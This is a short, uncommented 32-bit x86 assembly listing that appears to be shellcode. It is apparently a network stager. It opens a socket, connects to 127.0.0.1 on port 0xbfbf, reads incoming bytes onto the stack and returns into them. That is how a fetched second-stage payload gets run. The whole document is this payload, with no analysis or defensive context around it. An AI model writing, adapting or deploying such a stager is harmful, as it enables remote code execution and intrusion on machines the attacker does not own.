BITS   32
GLOBAL main

main:

socket:
	push byte 97
	pop  eax
	cdq
	push edx
	inc  edx
	push edx
	inc  edx
	push edx
	push edx
	int  0x80

connect:
	pop  edx
	push 0x0100007f
	push word 0xbfbf
	push dx
	mov  ecx, esp
	push byte 0x10
	push ecx
	push eax
	push ecx
	push byte 98
	pop  eax
	int  0x80

read:
	mov  al, 0x3
	mov  byte [ecx - 0x3], 0x10
	int  0x80
	ret
